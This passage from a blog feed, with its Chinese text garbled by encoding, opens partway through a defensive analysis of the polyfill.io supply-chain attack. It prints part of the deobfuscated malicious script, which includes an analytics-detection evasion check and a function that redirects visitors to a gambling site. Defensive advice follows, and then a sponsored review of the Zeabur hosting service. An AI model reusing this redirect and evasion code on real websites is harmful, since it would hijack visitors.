punctuation">.</span>cookie<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token string">'adminlevels'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token function">vfed_update</span><span class="token punctuation">(</span>redirectUrl<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">// Check for certain analytics tools in the document and trigger redirection logic accordingly</span><span class="token keyword">const</span> htmlContent <span class="token operator">=</span> document<span class="token punctuation">.</span>documentElement<span class="token punctuation">.</span>outerHTML<span class="token punctuation">;</span><span class="token keyword">const</span> analyticsTools <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'hm.baidu.com'</span><span class="token punctuation">,</span> <span class="token string">'.cnzz.com'</span><span class="token punctuation">,</span> <span class="token string">'.51.la'</span><span class="token punctuation">,</span> <span class="token string">'.matomo.org'</span><span class="token punctuation">,</span> <span class="token string">'.google-analytics.com'</span><span class="token punctuation">,</span> <span class="token string">'.googletagmanager.com'</span><span class="token punctuation">,</span> <span class="token string">'.plausible.io'</span><span class="token punctuation">,</span> <span class="token string">'.statcounter.com'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">const</span> analyticsFound <span class="token operator">=</span> analyticsTools<span class="token punctuation">.</span><span class="token function">some</span><span class="token punctuation">(</span><span class="token parameter">tool</span> <span class="token operator">=></span> htmlContent<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span>tool<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>analyticsFound<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token function">setTimeout</span><span class="token punctuation">(</span>check_tiaozhuan<span class="token punctuation">,</span> <span class="token number">2000</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>  <span class="token function">check_tiaozhuan</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å‡½å¼åç¨±å«åš check_tiaozhuanï¼ˆæª¢æŸ¥è·³è½‰ï¼‰ï¼Œç›´æ¥ç”¨ä¸­æ–‡è®Šæ•¸åç¨±ä¸æ¼”äº†ã€‚</p><p>ç¸½ä¹‹å‘¢ï¼Œåšäº†è¨±å¤šæª¢æŸ¥ä¹‹å¾Œï¼Œæœ€å¾ŒæœƒæŠŠä½ å°åˆ°ä¸€å€‹è¶Šå—çš„ç¶²ç«™ï¼Œçœ‹èµ·ä¾†æ˜¯é‹å‹•è³½äº‹è³­åšçš„é‚£ç¨®ã€‚</p><p>å› æ­¤å‘¢ï¼Œå¦‚æœä½ çš„ç¶²ç«™ä¸Šæœ‰å¼•å…¥åˆ° <code>cdn.polyfill.io</code> çš„ç¨‹å¼ç¢¼ï¼Œè«‹ç«‹åˆ»æ‹¿æ‰ï¼Œå¦å‰‡æœ‰äº›ä½¿ç”¨è€…å°±æœƒè«åå…¶å¦™åœ°è¢«å°åˆ°å…¶ä»–ç¶²ç«™å»ã€‚è€Œä¸”ï¼Œæˆ‘ä¹Ÿä¸èƒ½ä¿è­‰åæ··æ·†è·Ÿ ChatGPT é‚„åŸå‡ºä¾†çš„çµæœä¸€å®šæ­£ç¢ºï¼Œéƒ½å·²ç¶“å¯ä»¥åŸ·è¡Œ JavaScript åšä¾›æ‡‰éˆæ”»æ“Šäº†ï¼Œå®ƒèƒ½åšçš„äº‹æƒ…å…¶å¯¦æ›´å¤šï¼Œå¦‚æœæœ‰äººè·Ÿæˆ‘èªªä»–é‚„æœ‰å·æ‹¿ cookie æˆ–æ˜¯ localStorage ä»€éº¼çš„ï¼Œé€™æˆ‘ä¹Ÿæœƒç›¸ä¿¡ï¼ˆä½†ç›®å‰çš„ç¨‹å¼ç¢¼æ²’çœ‹åˆ°ï¼‰ã€‚</p><h2><span id="æœªä¾†è©²å¦‚ä½•é˜²ç¦¦">æœªä¾†è©²å¦‚ä½•é˜²ç¦¦ï¼Ÿ</span></h2><p>å…ˆè²æ˜ä¸€ä¸‹ï¼Œä¹‹æ‰€ä»¥æœƒæœ‰è³‡å®‰å•é¡Œï¼Œä¸¦ä¸æ˜¯ polyfill service æœ¬èº«çš„éŒ¯ï¼Œå®ƒæ˜¯ç„¡è¾œçš„ï¼Œå¦‚æœä½ æƒ³ç¹¼çºŒç”¨çš„è©±ï¼Œå¯ä»¥è‡ªå·±æ¶ä¸€å€‹ï¼Œé€™å®Œå…¨æ²’æœ‰å•é¡Œã€‚å•é¡Œæ˜¯å‡ºåœ¨ã€Œå¼•å…¥äº†æƒ¡æ„ç¶²åŸŸ cdn.polyfill.io çš„ JavaScriptã€é€™ä»¶äº‹æƒ…ä¸Šé¢ã€‚</p><p>å¼•å…¥ç¬¬ä¸‰æ–¹å¥—ä»¶æœ¬ä¾†å°±æœƒé€ æˆä¸€äº›è³‡å®‰ä¸Šçš„é¢¨éšªï¼Œæ›´åˆ¥ææ˜¯åƒé€™ç¨®ç›´æ¥å¾€ CDN æ‹¿çš„ï¼Œé¢¨éšªå°±æ›´é«˜äº†ã€‚</p><p>æœ€å¥½çš„é˜²ç¦¦å°±æ˜¯ï¼šä¸è¦ç”¨ã€‚</p><p>ä¸ç®¡æ˜¯ä¾†è·¯ä¸æ˜çš„ <code>cdn.polyfill.io</code> é‚„æ˜¯è€ç‰Œçš„ cdnjsï¼Œå…¨éƒ¨éƒ½ä¸è¦ç”¨ï¼Œå› ç‚ºç”¨äº†å°±æ˜¯æœ‰é¢¨éšªã€‚å°±ç®—é€£ cdnjs éƒ½æœ‰é¢¨éšªï¼Œè©³æƒ…å¯åƒè€ƒï¼š<a href="https://blog.huli.tw/2021/08/22/cdnjs-and-supply-chain-attack/">å¾ cdnjs çš„æ¼æ´ä¾†çœ‹å‰ç«¯çš„ä¾›æ‡‰éˆæ”»æ“Šèˆ‡é˜²ç¦¦</a>ã€‚</p><p>å¦‚æœçœŸçš„ä¸€å®šè¦ç”¨ï¼Œè¨˜å¾—åŠ ä¸Š <code>integrity</code> å±¬æ€§ï¼Œå®ƒèƒ½ä¿è­‰ response å¦‚æœè¢«ç¯¡æ”¹äº†ï¼Œå°±ä¸æœƒè¢«è¼‰å…¥ï¼Œå¤šäº†ä¸€å±¤é˜²ç¦¦ã€‚</p><p>ä½†åƒæ˜¯ <code>cdn.polyfill.io</code> é€™ç¨®åŸæœ¬å°±æ˜¯å‹•æ…‹å…§å®¹çš„å°±æ²’è¾¦æ³•äº†ï¼Œå› ç‚º <code>integrity</code> åªèƒ½é‡å°å›ºå®šçš„å…§å®¹ã€‚</p><p>æ‰€ä»¥å¦‚æœå¯ä»¥çš„è©±ï¼Œç›¡é‡ä¸è¦ç”¨é€™äº›ç¬¬ä¸‰æ–¹çš„å¥—ä»¶ã€‚</p><p>è©±èªªæœ‰ä¸å°‘äººç”¨çš„ Disqus å…¶å¯¦ä¹Ÿå¹¹éé€™ç¨®äº‹ï¼Œè©³æƒ…å¯ä»¥åƒè€ƒï¼š<a href="https://www.keeganleary.com/disqus-is-evil-trash/">Disqus is Evil Trash ğŸ—‘</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;Polyfill.io æ˜¯ä¸€å€‹èƒ½å¤ è‡ªå‹•æä¾›å‰ç«¯ polyfill çš„æœå‹™ï¼Œä½¿ç”¨æ–¹æ³•ç›¸ç•¶æ–¹ä¾¿ï¼Œåªéœ€è¦é¸æ“‡æƒ³è¢« polyfill çš„åŠŸèƒ½ï¼Œå†å¼•å…¥ä¸€å€‹ JavaScript æª”æ¡ˆå³å¯ï¼š&lt;/p&gt;
&lt;pre class=&quot;line-numbers language-markup&quot; data-language=&quot;markup&quot;&gt;&lt;code class=&quot;language-markup&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;script&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;src&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;https://polyfill.io/v3/polyfill.min.js&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token script&quot;&gt;&lt;/span&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;script&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Server ç«¯æœƒè‡ªå‹•æ ¹æ“š user-agent ä¾†åˆ¤æ–·æ˜¯ä¸æ˜¯éœ€è¦å›å‚³ polyfillï¼Œæ‰€ä»¥åªæœƒå¼•å…¥çœŸçš„éœ€è¦çš„ç¨‹å¼ç¢¼ï¼Œè½èµ·ä¾†æ–¹ä¾¿åˆå¥½ç”¨ã€‚&lt;/p&gt;
&lt;p&gt;ä½†é€™å¹¾å¤©æ‡‰è©²æœ‰äººæ”¶åˆ° Google Ads çš„é€šçŸ¥ï¼Œèªªé€™æœ‰ security issueï¼Œé€™åˆæ˜¯çˆ²ä»€éº¼å‘¢ï¼Ÿ&lt;/p&gt;</summary>
    
    
    
    <category term="Security" scheme="https://blog.huli.tw/categories/Security/"/>
    
    
    <category term="Security" scheme="https://blog.huli.tw/tags/Security/"/>
    
  </entry>
  
  
  
  <entry>
    <title>å¿«é€Ÿéƒ¨ç½²ç¶²ç«™çš„æ–°é¸æ“‡ï¼šZeabur ä½¿ç”¨å¿ƒå¾—</title>
    <link href="https://blog.huli.tw/2024/04/14/zeabur-introduction-deploy-service/"/>
    <id>https://blog.huli.tw/2024/04/14/zeabur-introduction-deploy-service/</id>
    <published>2024-04-14T02:40:00.000Z</published>
    <updated>2024-04-25T11:47:32.105Z</updated>
    
    <content type="html"><![CDATA[<p>ä»¥å‰ç•¶æˆ‘æƒ³è¦éƒ¨ç½²ä¸€å€‹ç°¡å–®çš„æœå‹™æ™‚ï¼Œæˆ‘æœƒå» Heroku ä¸Šé¢ï¼Œå› ç‚ºç°¡å–®è€Œä¸”å…è²»ï¼Œé›–ç„¶èªªé‚„æ˜¯æœ‰äº›ä½¿ç”¨é™åˆ¶ï¼Œä½†æ•´é«”è€Œè¨€é‚„æ˜¯å¾ˆæ–¹ä¾¿çš„ï¼Œç”šè‡³é‚„æœ‰ä¸€äº›ç°¡å–®çš„ DB å¯ä»¥ç”¨ã€‚å¦‚æœæ˜¯éœæ…‹ç¶²é ï¼Œæœƒé¸æ“‡ Netlify æˆ–æ˜¯ GitHub Pagesï¼Œä¹Ÿéƒ½æ˜¯ç°¡å–®æ–¹ä¾¿çš„é¸æ“‡ã€‚</p><p>ä½† Heroku å¾ 2022 å¹´å¹´åº•ä¹‹å¾Œå°±ä¸å†æä¾›å…è²»æ–¹æ¡ˆäº†ï¼Œå› æ­¤é‚£æ™‚ä¸€å †äººåœ¨å°‹æ‰¾æ›¿ä»£æ–¹æ¡ˆï¼ŒåŒ…æ‹¬ Render æˆ–æ˜¯ fly[dot]io ç­‰ç­‰ï¼Œéƒ½æ˜¯å¾ˆå¤šäººè·³æ§½çš„æ–°é¸æ“‡ã€‚è€Œæˆ‘è‡ªå·±ä»¥å‰å…¶å¯¦åœ¨ Heroku ä¸Šä¹Ÿæœ‰ä¸‰å››å€‹å°ˆæ¡ˆï¼Œå¾ Heroku æ”¹è®Šæ–¹æ¡ˆä¹‹å¾Œå°±å†ä¹Ÿæ²’ä¹Ÿå‹•éäº†ã€‚</p><p>å‰é™£å­æ”¶åˆ° <a href="https://zeabur.com/zh-TW">Zeabur</a> å‰µè¾¦äººçš„ä¾†ä¿¡ï¼Œå¸Œæœ›æœ‰æ©Ÿæœƒèƒ½è·Ÿæˆ‘åˆä½œæ¨å»£é€™å€‹å¹³å°ï¼Œæˆ‘è‡ªå·±è©¦äº†ä¹‹å¾Œç™¼ç¾é«”é©—ç¢ºå¯¦å¾ˆä¸éŒ¯ï¼Œå› æ­¤å°±å¯«äº†é€™ç¯‡æ–‡ç« ä»‹ç´¹ä¸€ä¸‹ã€‚</p><span id="more"></span><h2><span id="zeabur-åˆé«”é©—">Zeabur åˆé«”é©—</span></h2><p>Zeabur æ˜¯ä¸€å€‹èƒ½å¤ å¹«ä½ å¿«é€Ÿéƒ¨ç½²ç¶²ç«™çš„æœå‹™ï¼Œè€Œä¸”æ¨™æ¦œçš„æ˜¯ç°¡å–®å¿«é€Ÿï¼Œå¹¾ä¹ä¸ç”¨é¡å¤–å¤šè¨­å®šä¸€äº›ä»€éº¼ï¼Œå°±èƒ½å¤ éƒ¨ç½²æˆåŠŸã€‚</p><p>å…¶å¯¦æˆ‘ä¹‹å‰å·²ç¶“è½é Zeabur ä¸€æ®µæ™‚é–“äº†ï¼Œä½†ä¸€ç›´ä»¥ä¾†éƒ½æ²’æ©Ÿæœƒä½¿ç”¨ï¼Œé€™æ¬¡æƒ³èªªæ—¢ç„¶è¦åˆä½œï¼Œé‚£æˆ‘å°±æ‹¿ä¹‹å‰æ”¾åœ¨ Heroku å»æ­»æ‰çš„å°ˆæ¡ˆä¾†ç”¨å¥½äº†ã€‚</p><p>åœ¨ Zeabur å¾Œå°æ–°å¢ä¸€å€‹ app æ™‚ï¼Œå¯ä»¥é¸æ“‡ç”¨ä»€éº¼æ–¹å¼éƒ¨ç½²ï¼š</p><p><img src="/img/zeabur-introduction-deploy-service/p1.png" alt="é¸æ“‡éƒ¨ç½²æ–¹å¼"></p><p>æˆ‘é¸äº†æœ€æ–¹ä¾¿çš„ GitHubï¼Œæ¥ä¸‹ä¾†å°±æä¾›æˆæ¬Šè®“å®ƒå¯ä»¥è¨ªå•ä½ çš„å€‰åº«ï¼Œå°±å®Œæˆäº†ã€‚</p><p>å°ï¼Œæ˜¯çœŸçš„å®Œæˆäº†ã€‚</p><p>é¸å¥½ repo çš„åç¨±æŒ‰ä¸‹å»ä»¥å¾Œï¼Œå°±æœƒè‡ªå‹•é–‹å§‹ build ç„¶å¾Œéƒ¨ç½²ï¼Œå¤§æ¦‚éå€‹ä¸€å…©åˆ†é˜å°±æœƒçœ‹åˆ° runningï¼Œå·²ç¶“è·‘èµ·ä¾†äº†ï¼š</p><p><img src="/img/zeabur-introduction-deploy-service/p2.png" alt="éƒ¨ç½²å®Œæˆ"></p><p>è·‘èµ·ä¾†ä¹‹å¾Œè¨˜å¾—å»åº•ä¸‹çš„ã€Œç¶²è·¯ã€é‚£é‚Šè¨­å®šä¸€å€‹å…¬é–‹åŸŸåï¼Œæ‰èƒ½è¨ªå•å¾—åˆ°ï¼š</p><p><img src="/img/zeabur-introduction-deploy-service/p3.png" alt="è¨­ç½®åŸŸå"></p><p>æˆ‘è©¦äº†å…©å€‹ä»¥å‰æ”¾åœ¨ Heroku çš„å°ˆæ¡ˆï¼Œä¸€å€‹æ˜¯ç”¨ Node.js å¯«çš„ï¼Œå¦ä¸€å€‹æ˜¯ç”¨ç´” PHPï¼ˆæ²’æœ‰ä»»ä½•æ¡†æ¶ï¼‰ï¼Œå…©å€‹å°ˆæ¡ˆéƒ½æ˜¯é»ä¸€ä¸‹ä¹‹å¾Œå°±è‡ªå‹•è·‘å¾ŒçºŒæµç¨‹ï¼Œç„¶å¾Œå°±å®Œæˆäº†ã€‚</p><p>è€å¯¦èªªé€™å€‹é«”é©—æ˜¯çœŸçš„æ»¿ä»¤äººé©šè±”çš„ï¼ŒçœŸãƒ»ä¸€éµéƒ¨ç½²ï¼Œä»¥å‰åœ¨ç”¨ heroku çš„æ™‚å€™æˆ‘è¨˜å¾—å‰µå®Œ app é‚„è¦å…ˆä¸‹è¼‰ä»€éº¼ heroku-cliï¼Œç„¶å¾Œè·‘å€‹æŒ‡ä»¤å†æŠŠç¨‹å¼ç¢¼æ¨ä¸Šå»æ‰æœƒé–‹å§‹éƒ¨ç½²ï¼Œç›¸è¼ƒä¹‹ä¸‹ Zeabur çš„é«”é©—å¥½å¾ˆå¤šï¼ˆæˆ–è¨± Heroku å¾Œä¾†ä¹Ÿæœ‰é¡ä¼¼æ©Ÿåˆ¶ï¼Œä½†æˆ‘é‚„æ²’ç”¨åˆ°å®ƒå°±æ”¹æ–¹æ¡ˆäº†ï¼‰ã€‚</p><p>è€Œé€™å€‹é †æš¢çš„ä½¿ç”¨è€…é«”é©—ä¹Ÿæ˜¯æˆ‘æœƒç­”æ‡‰æ¥ä¸‹é€™å€‹åˆä½œçš„ä¸»å› ã€‚</p><h2><span id="æ”¶è²»æ–¹å¼">æ”¶è²»æ–¹å¼</span></h2><p>Zeabur çš„è¨ˆè²»æ–¹å¼æ»¿è¤‡é›œçš„ï¼Œç´°ç¯€åœ¨é€™å€‹é é¢ï¼š<a href="https://zeabur.com/zh-TW/pricing">https://zeabur.com/zh-TW/pricing</a></p><p>å…ˆå¾å…è²»ç‰ˆé–‹å§‹è¬›ï¼Œå…è²»ç‰ˆçš„è©±åªæ”¯æ´éœæ…‹ç¶²ç«™ï¼ˆåƒæ˜¯ GitHub Pages é‚£ç¨®ï¼‰ä»¥åŠ serverless functionï¼ˆåƒæ˜¯ AWS lambda é‚£ç¨®ï¼‰ï¼Œéœæ…‹ç¶²ç«™çš„éƒ¨åˆ†æˆ‘è¦ºå¾—æ²’æœ‰å¾ˆå¸å¼•äººï¼Œå› ç‚ºè€å¯¦èªª GitHub Pages æœƒæ˜¯æˆ‘æ›´æ¨è–¦çš„é¸æ“‡ï¼Œä½† serverless çš„éƒ¨åˆ†å€’æ˜¯æ»¿ä¸éŒ¯çš„ã€‚</p><p>èˆ‰ä¾‹ä¾†èªªï¼Œæˆ‘æœ‰ä¸€å€‹ Node.js çš„ app å…¶å¯¦ä¹Ÿæ²’å¹¹å˜›ï¼Œå°±æ˜¯ä¸€å€‹ç°¡å–®çš„ server è€Œä¸”æ²’æœ‰ DBï¼Œé€™æ™‚å€™å°±å¾ˆé©åˆæ”¹æˆ serverless çš„æ¶æ§‹ï¼Œå°±é©ç”¨æ–¼å…è²»ç‰ˆï¼Œå¯ä»¥ä¸€ç›´ç•¶å€‹å…è²»ä»”ã€‚</p><p>ä½†å¦‚æœ serverless æ²’è¾¦æ³•æ»¿è¶³ä½ ï¼Œå°±éœ€è¦åˆ‡æˆä»˜è²»ç‰ˆï¼ŒåŸºæœ¬ä¸Šæ¯å€‹æœˆæœ€å°‘æ˜¯ 5 å¡Šç¾é‡‘ã€‚ä»–å€‘çš„ä»˜è²»ç‰ˆæœƒæ ¹æ“šä½ ç”¨å¤šå°‘è¨˜æ†¶é«”ã€CPUã€å„²å­˜ç©ºé–“ä»¥åŠæµé‡ä¾†æ”¶éŒ¢ï¼Œç„¡è«–æœ‰æ²’æœ‰ç”¨æ»¿ï¼Œæœ€å°‘å°±æ˜¯ 5 å¡Šç¾é‡‘ï¼Œè€Œå¤šçš„å°±å†å¾€ä¸ŠåŠ ã€‚</p><p>é‚£ 5 å¡ŠéŒ¢ç¾é‡‘å¤§æ¦‚æ˜¯å¤šå°‘è³‡æºå‘¢ï¼Ÿ</p><p>å¦‚æœä¸ç®—æµé‡è·Ÿç©ºé–“ï¼ˆé€™å…©å€‹ç›¸å°ä¾¿å®œï¼Œå¦‚æœæ­£å¸¸ä½¿ç”¨çš„è©±ï¼‰çš„è©±ï¼Œæ¯å€‹æœˆ 512 MB çš„è¨˜æ†¶é«”æ˜¯ 2 å¡Šç¾é‡‘ï¼Œ0.25 vCPU æ˜¯ 3 å¡Šç¾é‡‘ï¼Œå·®ä¸å¤šå°±æ˜¯é€™å…©å€‹åŠ èµ·ä¾†ã€‚</p><p>é †å¸¶ä¸€æï¼ŒZeabur éå¸¸æ”¯æŒé–‹æºå°ˆæ¡ˆï¼Œæ‰€ä»¥å¦‚æœä½ æ˜¯é–‹æºå°ˆæ¡ˆçš„ maintainer çš„è©±ï¼Œå¯ä»¥è¯ç¹« <a href="https://zeabur.com/docs/zh-TW/billing/sponsor">Zeabur</a>ï¼Œé–‹æºå°ˆæ¡ˆæœ¬èº«å°±èƒ½ç²å¾—å…è²»ä½¿ç”¨ï¼Œè€Œå…¶ä»–å°ˆæ¡ˆçš„ contributor ä¹Ÿèƒ½æ‹¿åˆ° couponã€‚</p><h2><span id="zeabur-çš„å„ªé»èˆ‡ç¼ºé»">Zeabur çš„å„ªé»èˆ‡ç¼ºé»</span></h2><p>å°æˆ‘ä¾†èªª Zeabur æœ€å¤§çš„å„ªé»æ˜¯éƒ¨ç½²æ–¹ä¾¿å¿«é€Ÿï¼Œè¨±å¤šå°ˆæ¡ˆé»ä¸€ä¸‹å°±å¯ä»¥éƒ¨ç½²äº†ï¼Œä¸éœ€è¦é¡å¤–å†å¯«ä»€éº¼è¨­å®šæª”ï¼ˆä¸éæˆ‘ä¹Ÿåªè©¦éç°¡å–®çš„ï¼Œæ²’è©¦éæ›´è¤‡é›œçš„ï¼Œæ‰€ä»¥ä¸æ•¢ä¿è­‰ï¼‰ã€‚</p><p>å†ä¾†çš„è©±æ»¿å¤šäººå–œæ­¡ä»–å€‘çš„ä¸­æ–‡å®¢æœï¼Œç•¢ç«Ÿé€™ç¨® PaaS å¤§éƒ¨åˆ†éƒ½æ˜¯åœ‹å¤–çš„ï¼Œä¸­æ–‡å®¢æœå¯¦å±¬é›£èƒ½å¯è²´ã€‚</p><p>æœ€å¾Œçš„è©±å¦‚æœæœ‰å¾ˆå¤šå°å°ˆæ¡ˆæˆ‘è¦ºå¾—æ»¿é©åˆæ”¾ä¸Šé¢çš„ï¼Œå› ç‚ºè¨ˆè²»æ˜¯æŒ‰ç…§ä½¿ç”¨é‡ä¾†è¨ˆç®—ï¼Œä¾‹å¦‚èªªæˆ‘æœ‰ 5 å€‹å°å°ˆæ¡ˆï¼Œæ¯å€‹å¹³å‡å›ºå®šåƒ 100 MB è¨˜æ†¶é«”ï¼ŒCPU ä½¿ç”¨ä¹Ÿä¸å¤§ï¼Œé‚£å¯èƒ½å…¨éƒ¨åŠ èµ·ä¾†å°±æ˜¯æœˆè²»äº”å¡Šç¾é‡‘ï¼Œæ»¿åˆ’ç®—çš„ã€‚</p><p>å†ä¾†è¬›è¬›ç¼ºé»ã€‚</p><p>æœ€ä»¤äººæ“”æ†‚çš„é»å¤§æ¦‚å°±æ˜¯æœå‹™çš„æŒçºŒæ€§ï¼Œç•¢ç«Ÿæ–°å‰µå…¬å¸çš„é™£äº¡ç‡å¤§å®¶éƒ½æ˜¯çŸ¥é“çš„ï¼Œæœ‰å¯èƒ½å“ªå¤©ç‡Ÿæ”¶ä¸ä½³å°±æ•´å€‹æ”¶æ‰äº†ï¼Œåˆ°æ™‚å€™è¦é·ç§»å°ˆæ¡ˆä¹Ÿæ˜¯æŒºéº»ç…©çš„ã€‚</p><p>æ¥è‘—çš„è©±æ˜¯ç©©å®šæ€§ï¼Œç•¢ç«Ÿæ˜¯è¦æ¨¡æ¯”è¼ƒå°çš„å…¬å¸ï¼Œä½¿ç”¨è€…ä¹Ÿé‚„æ²’æœ‰é€™éº¼å¤šï¼Œä¸ç¢ºå®šç•¶ä½¿ç”¨è€…è®Šå¤šçš„æ™‚å€™ï¼Œæ©Ÿå™¨æ˜¯ä¸æ˜¯èƒ½å³æ™‚æ‰›ä½ï¼Œé€™é»é‚„éœ€è¦æ™‚é–“ä¾†è€ƒé©—ã€‚</p><h2><span id="é©åˆä½¿ç”¨-zeabur-çš„äºº">é©åˆä½¿ç”¨ Zeabur çš„äºº</span></h2><p>å¦‚æœä½ æœ‰å€‹çŸ­æœŸçš„å°ˆæ¡ˆéœ€è¦æ‰¾åœ°æ–¹éƒ¨ç½²ï¼Œåˆæ‡¶å¾—è‡ªå·±å»ç®¡é‚£äº›æ©Ÿå™¨ä»¥åŠè¨­ç½®ç’°å¢ƒï¼Œé‚£æˆ‘è¦ºå¾— Zeabur æ˜¯å€‹å¯ä»¥è€ƒæ…®çš„åœ°æ–¹ï¼Œç•¢ç«Ÿæ–¹ä¾¿è€Œä¸”åƒ¹æ ¼åˆä¸è²´ã€‚</p><p>é€™å€‹çŸ­æœŸå°ˆæ¡ˆå¯ä»¥æ˜¯æ´»å‹•ç¶²ç«™ï¼Œä¹Ÿå¯ä»¥æ˜¯é¢è©¦çš„æ™‚å€™è¦æ‹¿ä¾† demo çš„å°ˆæ¡ˆç­‰ç­‰ã€‚</p><p>æˆ–æ˜¯ä½ å¸¸å¸¸æœ‰å¾ˆå¤šå°å°ˆæ¡ˆï¼Œæ²’æœ‰åƒé€™éº¼å¤šè³‡æºï¼Œä¹Ÿå¯ä»¥è€ƒæ…® Zeaburï¼Œå‰›å‰›æˆ‘ä¹Ÿæéè¨ˆè²»æ–¹å¼äº†ï¼Œå¯ä»¥è‡ªå·±ç®—ä¸€ä¸‹æ˜¯ä¸æ˜¯æœƒæ¯”è¼ƒåˆ’ç®—ã€‚å¦‚æœæœå‹™å¤šè€Œä¸”åƒçš„è³‡æºä¹Ÿæ¯”è¼ƒå¤šï¼Œå»è²·æ¯å€‹æœˆ 5 å¡Šã€10 å¡Šç¾é‡‘çš„ VPS å¯èƒ½æœƒæ˜¯æ›´åˆ’ç®—çš„é¸æ“‡ï¼ˆä½†è¦å¤šèŠ±æ™‚é–“è¨­ç½®ç’°å¢ƒå°±æ˜¯äº†ï¼‰ã€‚</p><p>é™¤æ­¤ä¹‹å¤–ï¼ŒZeabur ä¹Ÿæœ‰æä¾›å¾ˆå¤šå¯«å¥½çš„æ¨¡æ¿ï¼Œèƒ½å¤ å¹«ä½ å¿«é€Ÿä¸€éµéƒ¨ç½²æœå‹™ï¼Œä¾‹å¦‚èªª <a href="https://vocus.cc/article/64be2c84fd8978000182de71">WordPress</a>ï¼Œè‹¥æ˜¯æƒ³è¦è‡ªå·±æ¶ä¸€å€‹çš„è©±ï¼Œä¹Ÿå¯ä»¥è€ƒæ…®çœ‹çœ‹ã€‚</p><h2><span id="çµèª">çµèª</span></h2><p>ä»¥ä¸Šå°±æ˜¯å°æ–¼ Zeabur çš„ä»‹ç´¹ï¼Œé›–ç„¶æœ‰æåˆ°èªªå…è²»æ–¹æ¡ˆåªèƒ½éƒ¨ç½²éœæ…‹ç¶²ç«™ä»¥åŠ serverlessï¼Œä½†å…¶å¯¦ä¸å…¨ç„¶æ­£ç¢ºï¼Œå› ç‚ºç›®å‰å…è²»æ–¹æ¡ˆä¹Ÿå¯ä»¥éƒ¨ç½²ä¸€èˆ¬çš„é‚£ç¨®å®¹å™¨åŒ–æœå‹™ï¼ˆä¸€æ•´å€‹ serverï¼‰ï¼Œåªæ˜¯æœƒè·³ä¸€å€‹æç¤ºèªªéš¨æ™‚æœ‰å¯èƒ½è¢«ç æ‰ï¼ˆç•¢ç«Ÿæ²’ä»˜éŒ¢ï¼Œè€Œä¸”æ˜¯é€£ä¿¡ç”¨å¡éƒ½æ²’ç¶ï¼‰ã€‚</p><p>å› æ­¤ï¼Œå¦‚æœå° Zeabur çš„æœå‹™æœ‰èˆˆè¶£ï¼Œå…¶å¯¦å¯ä»¥å…ˆè¨»å†Šä¸€å€‹å¸³è™Ÿå»ç©ç©çœ‹ï¼ŒæŠŠè‡ªå·±æœå‹™æ”¾ä¸Šå»è©¦è©¦ï¼Œå¦‚æœçœŸçš„è¦ºå¾—ä¸éŒ¯å†ä¾†ä»˜éŒ¢ï¼Œè®“æœå‹™ç©©å®šä½åœ¨é‚£é‚Šã€‚</p><p>é€™æ˜¯æœ‰æˆ‘æ¨è–¦ç¢¼çš„é€£çµï¼Œå¦‚æœä½ ç”¨äº†ä¹‹å¾Œæœ‰ä»˜è²»ï¼Œæˆ‘ä¼¼ä¹æœƒæ‹¿åˆ° 5 å¡Šç¾é‡‘çš„ creditï¼š<a href="https://zeabur.com/?referralCode=aszx87410">https://zeabur.com?referralCode=aszx87410</a></p><p>é€™æ˜¯æ²’æœ‰æˆ‘æ¨è–¦ç¢¼çš„ä¹¾æ·¨å®˜æ–¹é€£çµï¼š<a href="https://zeabur.com/">https://zeabur.com</a></p><h2><span id="å¾Œè¨˜">å¾Œè¨˜</span></h2><p>ä¹‹å‰è·Ÿ Zeabur 